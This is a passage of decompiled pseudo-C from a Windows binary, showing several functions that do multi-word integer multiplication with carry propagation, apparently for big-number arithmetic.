  v555 = v554 < *((_QWORD *)&v552 + 1);
  v556 = a2[13] * (unsigned __int128)a3[14];
  v557 = v553 + v556;
  *((_QWORD *)&v556 + 1) += v553 + (unsigned __int64)v556 < v553;
  v558 = *((_QWORD *)&v556 + 1) + v554;
  v559 = (v558 < *((_QWORD *)&v556 + 1)) + v555;
  v560 = a2[14] * (unsigned __int128)a3[13];
  v561 = v557 + v560;
  *((_QWORD *)&v560 + 1) += v557 + (unsigned __int64)v560 < v557;
  v562 = *((_QWORD *)&v560 + 1) + v558;
  v563 = (v562 < *((_QWORD *)&v560 + 1)) + v559;
  v564 = a2[15] * (unsigned __int128)a3[12];
  *(_QWORD *)&v564 = v561 + v564;
  a1[11] = v564;
  *((_QWORD *)&v564 + 1) += (unsigned __int64)v564 < v561;
  v565 = *((_QWORD *)&v564 + 1) + v562;
  v566 = (v565 < *((_QWORD *)&v564 + 1)) + v563;
  v567 = a2[13] * (unsigned __int128)a3[15];
  v568 = v565 + v567;
  *((_QWORD *)&v567 + 1) += v565 + (unsigned __int64)v567 < v565;
  v569 = *((_QWORD *)&v567 + 1) + v566;
  v570 = v569 < *((_QWORD *)&v567 + 1);
  v571 = a2[14] * (unsigned __int128)a3[14];
  v572 = v568 + v571;
  *((_QWORD *)&v571 + 1) += v568 + (unsigned __int64)v571 < v568;
  v573 = *((_QWORD *)&v571 + 1) + v569;
  v574 = (v573 < *((_QWORD *)&v571 + 1)) + v570;
  v575 = a2[15] * (unsigned __int128)a3[13];
  *(_QWORD *)&v575 = v572 + v575;
  a1[12] = v575;
  *((_QWORD *)&v575 + 1) += (unsigned __int64)v575 < v572;
  v576 = *((_QWORD *)&v575 + 1) + v573;
  v577 = (v576 < *((_QWORD *)&v575 + 1)) + v574;
  v578 = a2[14] * (unsigned __int128)a3[15];
  v579 = v576 + v578;
  *((_QWORD *)&v578 + 1) += v576 + (unsigned __int64)v578 < v576;
  v580 = *((_QWORD *)&v578 + 1) + v577;
  v581 = v580 < *((_QWORD *)&v578 + 1);
  v582 = a2[15] * (unsigned __int128)a3[14];
  *(_QWORD *)&v582 = v579 + v582;
  a1[13] = v582;
  *((_QWORD *)&v582 + 1) += (unsigned __int64)v582 < v579;
  v583 = *((_QWORD *)&v582 + 1) + v580;
  v584 = (v583 < *((_QWORD *)&v582 + 1)) + v581;
  v585 = a2[15] * (unsigned __int128)a3[15];
  result = v583 + v585;
  a1[14] = result;
  a1[15] = v584 + (result < v583) + *((_QWORD *)&v585 + 1);
  return result;
}
// 13F118F80: too many cbuild loops

//----- (000000013F119FD0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F119FD0(unsigned __int64 *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 v4; // r10
  unsigned __int128 v5; // rax
  __int64 v6; // rdi
  unsigned __int64 v7; // r9
  unsigned __int128 v8; // rax
  unsigned __int64 result; // rax

  v4 = (*a2 * (unsigned __int128)*a3) >> 64;
  v5 = *a2 * (unsigned __int128)a3[1];
  v6 = (v4 + (unsigned __int64)v5 < v4) + *((_QWORD *)&v5 + 1);
  v7 = (v4 + (_QWORD)v5 + a2[1] * *a3 < v4 + (unsigned __int64)v5) + ((a2[1] * (unsigned __int128)*a3) >> 64);
  v8 = a2[1] * (unsigned __int128)a3[1];
  result = v7 + v6 + v8;
  *a1 = result;
  a1[1] = *((_QWORD *)&v8 + 1) + (v7 + v6 < v7) + (unsigned __int64)(result < v7 + v6);
  return result;
}

//----- (000000013F11A060) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11A060(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r10
  unsigned __int64 v5; // r15
  unsigned __int64 v7; // r13
  unsigned __int64 v8; // r9
  __int64 v9; // r11
  unsigned __int64 v10; // r12
  unsigned __int64 v11; // rbx
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // r11
  _BOOL8 v14; // r8
  unsigned __int64 v15; // rdx
  unsigned __int64 v16; // r11
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // rbp
  unsigned __int64 v19; // r14
  unsigned __int64 v20; // r8
  unsigned __int64 v21; // rsi
  unsigned __int128 v22; // rax
  unsigned __int64 v23; // r15
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // r10
  unsigned __int128 v26; // rax
  unsigned __int64 v27; // r8
  unsigned __int64 v28; // rdi
  unsigned __int64 v29; // rbx
  bool v30; // cf
  unsigned __int128 v31; // rax
  unsigned __int64 v32; // rsi
  unsigned __int64 v33; // rdi
  unsigned __int64 v34; // r8
  unsigned __int64 v35; // rbx
  unsigned __int128 v36; // rax
  unsigned __int64 v37; // r9
  unsigned __int128 v38; // rax
  unsigned __int64 v39; // rcx
  unsigned __int64 v40; // r11
  unsigned __int64 v41; // r8
  _BOOL8 v42; // rbp
  unsigned __int128 v43; // rax
  unsigned __int64 v44; // rcx
  _BOOL8 v45; // rbp
  unsigned __int128 v46; // rax
  unsigned __int64 result; // rax

  v4 = *a2;
  v5 = a3[1];
  v7 = a2[1];
  v8 = *a3;
  v9 = (*a2 * (unsigned __int128)a3[2]) >> 64;
  v10 = a3[3];
  v11 = a2[2];
  v12 = (v7 * (unsigned __int128)v5) >> 64;
  v13 = v12 + v9;
  v14 = v13 < v12;
  v15 = (v11 * (unsigned __int128)*a3) >> 64;
  v16 = v15 + v13;
  v17 = v16 + v4 * a3[3];
  v18 = (v17 < v16) + ((v4 * (unsigned __int128)a3[3]) >> 64);
  v19 = (v16 < v15) + v14 + v18;
  v20 = v17 + v7 * a3[2];
  v21 = (v20 < v17) + ((v7 * (unsigned __int128)a3[2]) >> 64);
  v22 = v11 * (unsigned __int128)v5;
  v23 = a2[3];
  v24 = v20 + v22;
  v25 = (v20 + (unsigned __int64)v22 < v20) + *((_QWORD *)&v22 + 1);
  v26 = v23 * (unsigned __int128)v8;
  v27 = v19 + v21 + v25;
  *((_QWORD *)&v26 + 1) += v24 + (unsigned __int64)v26 < v24;
  v28 = (v27 + *((_QWORD *)&v26 + 1) < *((_QWORD *)&v26 + 1))
      + (v19 < v18)
      + (v27 < v25)
      + (unsigned __int64)(v19 + v21 < v21);
  v29 = (a4 < v24 + (unsigned __int64)v26) + v27 + *((_QWORD *)&v26 + 1);
  v30 = __PAIR128__(v29, a4) < v24 + (unsigned __int64)v26;
  v31 = v7 * (unsigned __int128)v10;
  v32 = (v29 + (unsigned __int64)v31 < v29) + *((_QWORD *)&v31 + 1);
  v33 = v32 + v30 + v28;
  v34 = v29 + v31 + a2[2] * a3[2];
  v35 = (v34 < v29 + (unsigned __int64)v31) + ((a2[2] * (unsigned __int128)a3[2]) >> 64);
  v36 = v23 * (unsigned __int128)a3[1];
  *(_QWORD *)&v36 = v34 + v36;
  v37 = ((unsigned __int64)v36 < v34) + *((_QWORD *)&v36 + 1);
  *a1 = v36;
  v38 = a2[2] * (unsigned __int128)a3[3];
  v39 = v33 + v35 + v37;
  v40 = v39 + v38;
  *((_QWORD *)&v38 + 1) += v39 + (unsigned __int64)v38 < v39;
  v41 = (v33 < v32) + *((_QWORD *)&v38 + 1) + (v39 < v37) + (unsigned __int64)(v33 + v35 < v35);
  v42 = v41 < *((_QWORD *)&v38 + 1);
  v43 = a2[3] * (unsigned __int128)a3[2];
  *(_QWORD *)&v43 = v40 + v43;
  a1[1] = v43;
  *((_QWORD *)&v43 + 1) += (unsigned __int64)v43 < v40;
  v44 = v41 + *((_QWORD *)&v43 + 1);
  v45 = (v41 + *((_QWORD *)&v43 + 1) < *((_QWORD *)&v43 + 1)) + v42;
  v46 = a2[3] * (unsigned __int128)a3[3];
  result = v44 + v46;
  a1[2] = result;
  a1[3] = v45 + (result < v44) + *((_QWORD *)&v46 + 1);
  return result;
}

//----- (000000013F11A240) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11A240(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rsi
  unsigned __int64 v8; // rbx
  __int64 v9; // r11
  unsigned __int64 v10; // r14
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r11
  _BOOL8 v13; // r8
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // r11
  _BOOL8 v16; // r8
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // r11
  _BOOL8 v19; // r8
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // r11
  _BOOL8 v22; // r8
  unsigned __int64 v23; // rdx
  unsigned __int64 v24; // r11
  _BOOL8 v25; // r8
  unsigned __int64 v26; // rdx
  unsigned __int64 v27; // r11
  unsigned __int64 v28; // rcx
  unsigned __int64 v29; // r13
  unsigned __int64 v30; // r12
  unsigned __int64 v31; // r8
  unsigned __int64 v32; // r15
  unsigned __int128 v33; // rax
  unsigned __int64 v34; // rcx
  unsigned __int64 v35; // rsi
  unsigned __int64 v36; // rdi
  unsigned __int64 v37; // r8
  unsigned __int64 v38; // r11
  unsigned __int64 v39; // rcx
  unsigned __int64 v40; // r9
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // r8
  unsigned __int64 v43; // rbx
  unsigned __int64 v44; // rcx
  unsigned __int64 v45; // r14
  unsigned __int128 v46; // rax
  unsigned __int64 v47; // r9
  unsigned __int64 v48; // r8
  unsigned __int64 v49; // r14
  unsigned __int128 v50; // rax
  unsigned __int64 v51; // rcx
  unsigned __int64 v52; // r9
  unsigned __int64 v53; // r14
  unsigned __int128 v54; // rax
  unsigned __int64 v55; // rcx
  unsigned __int64 v56; // r9
  _BOOL8 v57; // r11
  unsigned __int128 v58; // rax
  unsigned __int64 v59; // r8
  unsigned __int64 v60; // r9
  _BOOL8 v61; // r11
  unsigned __int128 v62; // rax
  unsigned __int64 v63; // rcx
  unsigned __int64 v64; // r9
  _BOOL8 v65; // r11
  unsigned __int128 v66; // rax
  unsigned __int64 v67; // r8
  unsigned __int64 v68; // r9
  _BOOL8 v69; // r11
  unsigned __int128 v70; // rax
  unsigned __int64 v71; // rcx
  unsigned __int64 v72; // r9
  _BOOL8 v73; // r11
  unsigned __int128 v74; // rax
  unsigned __int64 v75; // r8
  unsigned __int64 v76; // r9
  _BOOL8 v77; // r11
  unsigned __int128 v78; // rax
  unsigned __int64 v79; // r9
  _BOOL8 v80; // r11
  unsigned __int128 v81; // rax
  unsigned __int64 v82; // rcx
  unsigned __int64 v83; // r11
  _BOOL8 v84; // r10
  unsigned __int128 v85; // rax
  unsigned __int64 v86; // r8
  unsigned __int64 v87; // r11
  _BOOL8 v88; // r10
  unsigned __int128 v89; // rax
  unsigned __int64 v90; // rcx
  unsigned __int64 v91; // r11
  _BOOL8 v92; // r10
  unsigned __int128 v93; // rax
  unsigned __int64 v94; // r8
  unsigned __int64 v95; // r11
  _BOOL8 v96; // r10
  unsigned __int128 v97; // rax
  unsigned __int64 v98; // rcx
  unsigned __int64 v99; // r11
  _BOOL8 v100; // r10
  unsigned __int128 v101; // rax
  unsigned __int64 v102; // r11
  _BOOL8 v103; // r10
  unsigned __int128 v104; // rax
  unsigned __int64 v105; // rcx
  unsigned __int64 v106; // r10
  _BOOL8 v107; // r9
  unsigned __int128 v108; // rax
  unsigned __int64 v109; // r8
  unsigned __int64 v110; // r10
  _BOOL8 v111; // r9
  unsigned __int128 v112; // rax
  unsigned __int64 v113; // rcx
  unsigned __int64 v114; // r10
  _BOOL8 v115; // r9
  unsigned __int128 v116; // rax
  unsigned __int64 v117; // r8
  unsigned __int64 v118; // r10
  _BOOL8 v119; // r9
  unsigned __int128 v120; // rax
  unsigned __int64 v121; // r10
  _BOOL8 v122; // r9
  unsigned __int128 v123; // rax
  unsigned __int64 v124; // rcx
  unsigned __int64 v125; // r9
  _BOOL8 v126; // r10
  unsigned __int128 v127; // rax
  unsigned __int64 v128; // r8
  unsigned __int64 v129; // r9
  _BOOL8 v130; // r10
  unsigned __int128 v131; // rax
  unsigned __int64 v132; // rcx
  unsigned __int64 v133; // r9
  _BOOL8 v134; // r10
  unsigned __int128 v135; // rax
  unsigned __int64 v136; // r9
  _BOOL8 v137; // r10
  unsigned __int128 v138; // rax
  unsigned __int64 v139; // rcx
  unsigned __int64 v140; // r10
  _BOOL8 v141; // r9
  unsigned __int128 v142; // rax
  unsigned __int64 v143; // r8
  unsigned __int64 v144; // r10
  _BOOL8 v145; // r9
  unsigned __int128 v146; // rax
  unsigned __int64 v147; // r10
  _BOOL8 v148; // r9
  unsigned __int128 v149; // rax
  unsigned __int64 v150; // rcx
  unsigned __int64 v151; // r9
  _BOOL8 v152; // rbx
  unsigned __int128 v153; // rax
  unsigned __int64 v154; // r9
  _BOOL8 v155; // rbx
  unsigned __int128 v156; // rax
  unsigned __int64 result; // rax

  v4 = a3[5];
  v8 = a2[2];
  v9 = (*a2 * (unsigned __int128)a3[6]) >> 64;
  v10 = a2[3];
  v11 = (a2[1] * (unsigned __int128)v4) >> 64;
  v12 = v11 + v9;
  v13 = v12 < v11;
  v14 = (v8 * (unsigned __int128)a3[4]) >> 64;
  v15 = v14 + v12;
  v16 = (v15 < v14) + v13;
  v17 = (v10 * (unsigned __int128)a3[3]) >> 64;
  v18 = v17 + v15;
  v19 = (v18 < v17) + v16;
  v20 = (a2[4] * (unsigned __int128)a3[2]) >> 64;
  v21 = v20 + v18;
  v22 = (v21 < v20) + v19;
  v23 = (a2[5] * (unsigned __int128)a3[1]) >> 64;
  v24 = v23 + v21;
  v25 = (v24 < v23) + v22;
  v26 = (a2[6] * (unsigned __int128)*a3) >> 64;
  v27 = v26 + v24;
  v28 = v27 + *a2 * a3[7];
  v29 = (v28 < v27) + ((*a2 * (unsigned __int128)a3[7]) >> 64);
  v30 = (v27 < v26) + v25 + v29;
  v31 = v28 + a2[1] * a3[6];
  v32 = (v31 < v28) + ((a2[1] * (unsigned __int128)a3[6]) >> 64);
  v33 = v8 * (unsigned __int128)v4;
  v34 = v31 + v33;
  v35 = (v31 + (unsigned __int64)v33 < v31) + *((_QWORD *)&v33 + 1);
  v36 = v35 + v32 + v30;
  v37 = v31 + v33 + v10 * a3[4];
  v38 = (v37 < v34) + ((v10 * (unsigned __int128)a3[4]) >> 64);
  v39 = v37 + a2[4] * a3[3];
  v40 = (v39 < v37) + ((a2[4] * (unsigned __int128)a3[3]) >> 64);
  v41 = a2[5] * (unsigned __int128)a3[2];
  v42 = v40 + v38 + v36;
  v43 = v39 + v41;
  *((_QWORD *)&v41 + 1) += v39 + (unsigned __int64)v41 < v39;
  v44 = *((_QWORD *)&v41 + 1) + v42;
  v45 = (*((_QWORD *)&v41 + 1) + v42 < *((_QWORD *)&v41 + 1))
      + (v30 < v29)
      + (v32 + v30 < v32)
      + (v36 < v35)
      + (v42 < v40)
      + (unsigned __int64)(v38 + v36 < v38);
  v46 = a2[6] * (unsigned __int128)a3[1];
  v47 = v43 + v46;
  *((_QWORD *)&v46 + 1) += v43 + (unsigned __int64)v46 < v43;
  v48 = *((_QWORD *)&v46 + 1) + v44;
  v49 = (*((_QWORD *)&v46 + 1) + v44 < *((_QWORD *)&v46 + 1)) + v45;
  v50 = a2[7] * (unsigned __int128)*a3;
  v51 = v47 + v50;
  *((_QWORD *)&v50 + 1) += v47 + (unsigned __int64)v50 < v47;
  v52 = (a4 < v47 + (unsigned __int64)v50) + v48 + *((_QWORD *)&v50 + 1);
  v53 = (__PAIR128__(v52, a4) < v51) + (v48 + *((_QWORD *)&v50 + 1) < *((_QWORD *)&v50 + 1)) + v49;
  v54 = a2[1] * (unsigned __int128)a3[7];
  v55 = v52 + v54;
  *((_QWORD *)&v54 + 1) += v52 + (unsigned __int64)v54 < v52;
  v56 = v53 + *((_QWORD *)&v54 + 1);
  v57 = v53 + *((_QWORD *)&v54 + 1) < *((_QWORD *)&v54 + 1);
  v58 = a2[2] * (unsigned __int128)a3[6];
  v59 = v55 + v58;
  *((_QWORD *)&v58 + 1) += v55 + (unsigned __int64)v58 < v55;
  v60 = *((_QWORD *)&v58 + 1) + v56;
  v61 = (v60 < *((_QWORD *)&v58 + 1)) + v57;
  v62 = a2[3] * (unsigned __int128)a3[5];
  v63 = v59 + v62;
  *((_QWORD *)&v62 + 1) += v59 + (unsigned __int64)v62 < v59;
  v64 = *((_QWORD *)&v62 + 1) + v60;
  v65 = (v64 < *((_QWORD *)&v62 + 1)) + v61;
  v66 = a2[4] * (unsigned __int128)a3[4];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = a2[5] * (unsigned __int128)a3[3];
  v71 = v67 + v70;
  *((_QWORD *)&v70 + 1) += v67 + (unsigned __int64)v70 < v67;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v73 = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  v74 = a2[6] * (unsigned __int128)a3[2];
  v75 = v71 + v74;
  *((_QWORD *)&v74 + 1) += v71 + (unsigned __int64)v74 < v71;
  v76 = *((_QWORD *)&v74 + 1) + v72;
  v77 = (v76 < *((_QWORD *)&v74 + 1)) + v73;
  v78 = a2[7] * (unsigned __int128)a3[1];
  *(_QWORD *)&v78 = v75 + v78;
  *a1 = v78;
  *((_QWORD *)&v78 + 1) += (unsigned __int64)v78 < v75;
  v79 = *((_QWORD *)&v78 + 1) + v76;
  v80 = (v79 < *((_QWORD *)&v78 + 1)) + v77;
  v81 = a2[2] * (unsigned __int128)a3[7];
  v82 = v79 + v81;
  *((_QWORD *)&v81 + 1) += v79 + (unsigned __int64)v81 < v79;
  v83 = *((_QWORD *)&v81 + 1) + v80;
  v84 = v83 < *((_QWORD *)&v81 + 1);
  v85 = a2[3] * (unsigned __int128)a3[6];
  v86 = v82 + v85;
  *((_QWORD *)&v85 + 1) += v82 + (unsigned __int64)v85 < v82;
  v87 = *((_QWORD *)&v85 + 1) + v83;
  v88 = (v87 < *((_QWORD *)&v85 + 1)) + v84;
  v89 = a2[4] * (unsigned __int128)a3[5];
  v90 = v86 + v89;
  *((_QWORD *)&v89 + 1) += v86 + (unsigned __int64)v89 < v86;
  v91 = *((_QWORD *)&v89 + 1) + v87;
  v92 = (v91 < *((_QWORD *)&v89 + 1)) + v88;
  v93 = a2[5] * (unsigned __int128)a3[4];
  v94 = v90 + v93;
  *((_QWORD *)&v93 + 1) += v90 + (unsigned __int64)v93 < v90;
  v95 = *((_QWORD *)&v93 + 1) + v91;
  v96 = (v95 < *((_QWORD *)&v93 + 1)) + v92;
  v97 = a2[6] * (unsigned __int128)a3[3];
  v98 = v94 + v97;
  *((_QWORD *)&v97 + 1) += v94 + (unsigned __int64)v97 < v94;
  v99 = *((_QWORD *)&v97 + 1) + v95;
  v100 = (v99 < *((_QWORD *)&v97 + 1)) + v96;
  v101 = a2[7] * (unsigned __int128)a3[2];
  *(_QWORD *)&v101 = v98 + v101;
  a1[1] = v101;
  *((_QWORD *)&v101 + 1) += (unsigned __int64)v101 < v98;
  v102 = *((_QWORD *)&v101 + 1) + v99;
  v103 = (v102 < *((_QWORD *)&v101 + 1)) + v100;
  v104 = a2[3] * (unsigned __int128)a3[7];
  v105 = v102 + v104;
  *((_QWORD *)&v104 + 1) += v102 + (unsigned __int64)v104 < v102;
  v106 = *((_QWORD *)&v104 + 1) + v103;
  v107 = v106 < *((_QWORD *)&v104 + 1);
  v108 = a2[4] * (unsigned __int128)a3[6];
  v109 = v105 + v108;
  *((_QWORD *)&v108 + 1) += v105 + (unsigned __int64)v108 < v105;
  v110 = *((_QWORD *)&v108 + 1) + v106;
  v111 = (v110 < *((_QWORD *)&v108 + 1)) + v107;
  v112 = a2[5] * (unsigned __int128)a3[5];
  v113 = v109 + v112;
  *((_QWORD *)&v112 + 1) += v109 + (unsigned __int64)v112 < v109;
  v114 = *((_QWORD *)&v112 + 1) + v110;
  v115 = (v114 < *((_QWORD *)&v112 + 1)) + v111;
  v116 = a2[6] * (unsigned __int128)a3[4];
  v117 = v113 + v116;
  *((_QWORD *)&v116 + 1) += v113 + (unsigned __int64)v116 < v113;
  v118 = *((_QWORD *)&v116 + 1) + v114;
  v119 = (v118 < *((_QWORD *)&v116 + 1)) + v115;
  v120 = a2[7] * (unsigned __int128)a3[3];
  *(_QWORD *)&v120 = v117 + v120;
  a1[2] = v120;
  *((_QWORD *)&v120 + 1) += (unsigned __int64)v120 < v117;
  v121 = *((_QWORD *)&v120 + 1) + v118;
  v122 = (v121 < *((_QWORD *)&v120 + 1)) + v119;
  v123 = a2[4] * (unsigned __int128)a3[7];
  v124 = v121 + v123;
  *((_QWORD *)&v123 + 1) += v121 + (unsigned __int64)v123 < v121;
  v125 = *((_QWORD *)&v123 + 1) + v122;
  v126 = v125 < *((_QWORD *)&v123 + 1);
  v127 = a2[5] * (unsigned __int128)a3[6];
  v128 = v124 + v127;
  *((_QWORD *)&v127 + 1) += v124 + (unsigned __int64)v127 < v124;
  v129 = *((_QWORD *)&v127 + 1) + v125;
  v130 = (v129 < *((_QWORD *)&v127 + 1)) + v126;
  v131 = a2[6] * (unsigned __int128)a3[5];
  v132 = v128 + v131;
  *((_QWORD *)&v131 + 1) += v128 + (unsigned __int64)v131 < v128;
  v133 = *((_QWORD *)&v131 + 1) + v129;
  v134 = (v133 < *((_QWORD *)&v131 + 1)) + v130;
  v135 = a2[7] * (unsigned __int128)a3[4];
  *(_QWORD *)&v135 = v132 + v135;
  a1[3] = v135;
  *((_QWORD *)&v135 + 1) += (unsigned __int64)v135 < v132;
  v136 = *((_QWORD *)&v135 + 1) + v133;
  v137 = (v136 < *((_QWORD *)&v135 + 1)) + v134;
  v138 = a2[5] * (unsigned __int128)a3[7];
  v139 = v136 + v138;
  *((_QWORD *)&v138 + 1) += v136 + (unsigned __int64)v138 < v136;
  v140 = *((_QWORD *)&v138 + 1) + v137;
  v141 = v140 < *((_QWORD *)&v138 + 1);
  v142 = a2[6] * (unsigned __int128)a3[6];
  v143 = v139 + v142;
  *((_QWORD *)&v142 + 1) += v139 + (unsigned __int64)v142 < v139;
  v144 = *((_QWORD *)&v142 + 1) + v140;
  v145 = (v144 < *((_QWORD *)&v142 + 1)) + v141;
  v146 = a2[7] * (unsigned __int128)a3[5];
  *(_QWORD *)&v146 = v143 + v146;
  a1[4] = v146;
  *((_QWORD *)&v146 + 1) += (unsigned __int64)v146 < v143;
  v147 = *((_QWORD *)&v146 + 1) + v144;
  v148 = (v147 < *((_QWORD *)&v146 + 1)) + v145;
  v149 = a2[6] * (unsigned __int128)a3[7];
  v150 = v147 + v149;
  *((_QWORD *)&v149 + 1) += v147 + (unsigned __int64)v149 < v147;
  v151 = *((_QWORD *)&v149 + 1) + v148;
  v152 = v151 < *((_QWORD *)&v149 + 1);
  v153 = a2[7] * (unsigned __int128)a3[6];
  *(_QWORD *)&v153 = v150 + v153;
  a1[5] = v153;
  *((_QWORD *)&v153 + 1) += (unsigned __int64)v153 < v150;
  v154 = *((_QWORD *)&v153 + 1) + v151;
  v155 = (v154 < *((_QWORD *)&v153 + 1)) + v152;
  v156 = a2[7] * (unsigned __int128)a3[7];
  result = v154 + v156;
  a1[6] = result;
  a1[7] = v155 + (result < v154) + *((_QWORD *)&v156 + 1);
  return result;
}

//----- (000000013F11A750) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11A750(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int128 v4; // rax
  unsigned __int64 v5; // rt0
  unsigned __int64 v6; // r8
  unsigned __int128 v7; // rax
  bool v8; // cf
  unsigned __int64 v9; // r10
  unsigned __int64 v10; // r11
  __int64 v11; // rbx
  unsigned __int64 v12; // r8
  signed __int128 v13; // rt0
  unsigned __int128 v14; // rax
  unsigned __int64 v15; // r10
  unsigned __int64 v16; // r11
  unsigned __int64 v17; // rcx
  __int64 v18; // rbx
  unsigned __int128 v19; // kr00_16
  unsigned __int128 v20; // rax
  unsigned __int64 v21; // r9
  __int64 v22; // rdi
  unsigned __int64 v23; // rbx
  unsigned __int64 v24; // r10
  __int64 v25; // rdi
  unsigned __int128 v26; // kr10_16
  unsigned __int128 v27; // rax
  __int64 v28; // rbx
  unsigned __int64 v29; // r8
  unsigned __int128 v30; // rax
  unsigned __int64 v31; // r10
  unsigned __int64 v32; // rdi
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r11
  __int64 v35; // rbx
  unsigned __int128 v36; // kr20_16
  unsigned __int128 v37; // rax
  unsigned __int64 v38; // r9
  __int64 v39; // rcx
  _BOOL8 v40; // rdi
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // rcx
  unsigned __int64 v43; // r11
  __int64 v44; // rdi
  unsigned __int64 v45; // rbx
  unsigned __int64 v46; // r10
  unsigned __int128 v47; // kr30_16
  unsigned __int128 v48; // rax
  unsigned __int64 v49; // r8
  __int64 v50; // r9
  _BOOL8 v51; // rbx
  unsigned __int128 v52; // rax
  unsigned __int64 v53; // r9
  unsigned __int64 v54; // r8
  __int64 v55; // rbx
  unsigned __int128 v56; // rax
  unsigned __int64 v57; // r10
  unsigned __int64 v58; // r9
  unsigned __int64 v59; // rdi
  unsigned __int64 v60; // r11
  __int64 v61; // rbx
  unsigned __int128 v62; // kr40_16
  unsigned __int128 v63; // rax
  unsigned __int64 v64; // r8
  __int64 v65; // r9
  _BOOL8 v66; // rdi
  unsigned __int128 v67; // rax
  unsigned __int64 v68; // rcx
  unsigned __int64 v69; // r9
  _BOOL8 v70; // rdi
  unsigned __int128 v71; // rax
  unsigned __int64 v72; // r9
  unsigned __int64 v73; // r11
  __int64 v74; // rdi
  unsigned __int64 v75; // rbx
  unsigned __int64 v76; // r10
  __int64 v77; // rdi
  unsigned __int128 v78; // kr50_16
  unsigned __int128 v79; // rax
  unsigned __int64 v80; // r8
  __int64 v81; // r9
  _BOOL8 v82; // rbx
  unsigned __int128 v83; // rax
  unsigned __int64 v84; // rcx
  unsigned __int64 v85; // r9
  _BOOL8 v86; // rbx
  unsigned __int128 v87; // rax
  unsigned __int64 v88; // r9
  unsigned __int64 v89; // r8
  __int64 v90; // rbx
  unsigned __int128 v91; // rax
  unsigned __int64 v92; // r9
  unsigned __int64 v93; // r10
  unsigned __int64 v94; // rdi
  unsigned __int64 v95; // r11
  __int64 v96; // rbx
  unsigned __int128 v97; // kr60_16
  unsigned __int128 v98; // rax
  unsigned __int64 v99; // r8
  __int64 v100; // r9
  _BOOL8 v101; // rdi
  unsigned __int128 v102; // rax
  unsigned __int64 v103; // rcx
  unsigned __int64 v104; // r9
  _BOOL8 v105; // rdi
  unsigned __int128 v106; // rax
  unsigned __int64 v107; // r8
  unsigned __int64 v108; // r9
  _BOOL8 v109; // rdi
  unsigned __int128 v110; // rax
  unsigned __int64 v111; // r9
  unsigned __int64 v112; // r11
  __int64 v113; // rdi
  unsigned __int64 v114; // rbx
  unsigned __int64 v115; // r10
  __int64 v116; // rdi
  unsigned __int128 v117; // kr70_16
  unsigned __int128 v118; // rax
  unsigned __int64 v119; // r8
  __int64 v120; // r9
  _BOOL8 v121; // rbx
  unsigned __int128 v122; // rax
  unsigned __int64 v123; // rcx
  unsigned __int64 v124; // r9
  _BOOL8 v125; // rbx
  unsigned __int128 v126; // rax
  unsigned __int64 v127; // r8
  unsigned __int64 v128; // r9
  _BOOL8 v129; // rbx
  unsigned __int128 v130; // rax
  unsigned __int64 v131; // r9
  unsigned __int64 v132; // r8
  __int64 v133; // rbx
  unsigned __int128 v134; // rax
  unsigned __int64 v135; // r10
  unsigned __int64 v136; // r9
  unsigned __int64 v137; // rdi
  unsigned __int64 v138; // r11
  __int64 v139; // rbx
  unsigned __int128 v140; // kr80_16
  unsigned __int128 v141; // rax
  unsigned __int64 v142; // r8
  __int64 v143; // r9
  _BOOL8 v144; // rdi
  unsigned __int128 v145; // rax
  unsigned __int64 v146; // rcx
  unsigned __int64 v147; // r9
  _BOOL8 v148; // rdi
  unsigned __int128 v149; // rax
  unsigned __int64 v150; // r8
  unsigned __int64 v151; // r9
  _BOOL8 v152; // rdi
  unsigned __int128 v153; // rax
  unsigned __int64 v154; // rcx
  unsigned __int64 v155; // r9
  _BOOL8 v156; // rdi
  unsigned __int128 v157; // rax
  unsigned __int64 v158; // r9
  unsigned __int64 v159; // r11
  __int64 v160; // rdi
  unsigned __int64 v161; // rbx
  unsigned __int64 v162; // r10
  __int64 v163; // rdi
  unsigned __int128 v164; // kr90_16
  unsigned __int128 v165; // rax
  unsigned __int64 v166; // r8
  __int64 v167; // r9
  _BOOL8 v168; // rbx
  unsigned __int128 v169; // rax
  unsigned __int64 v170; // rcx
  unsigned __int64 v171; // r9
  _BOOL8 v172; // rbx
  unsigned __int128 v173; // rax
  unsigned __int64 v174; // r8
  unsigned __int64 v175; // r9
  _BOOL8 v176; // rbx
  unsigned __int128 v177; // rax
  unsigned __int64 v178; // rcx
  unsigned __int64 v179; // r9
  _BOOL8 v180; // rbx
  unsigned __int128 v181; // rax
  unsigned __int64 v182; // r9
  unsigned __int64 v183; // r8
  __int64 v184; // rbx
  unsigned __int128 v185; // rax
  unsigned __int64 v186; // r10
  unsigned __int64 v187; // r9
  unsigned __int64 v188; // rdi
  unsigned __int64 v189; // r11
  __int64 v190; // rbx
  unsigned __int128 v191; // krA0_16
  unsigned __int128 v192; // rax
  unsigned __int64 v193; // r8
  __int64 v194; // r9
  _BOOL8 v195; // rdi
  unsigned __int128 v196; // rax
  unsigned __int64 v197; // rcx
  unsigned __int64 v198; // r9
  _BOOL8 v199; // rdi
  unsigned __int128 v200; // rax
  unsigned __int64 v201; // r8
  unsigned __int64 v202; // r9
  _BOOL8 v203; // rdi
  unsigned __int128 v204; // rax
  unsigned __int64 v205; // rcx
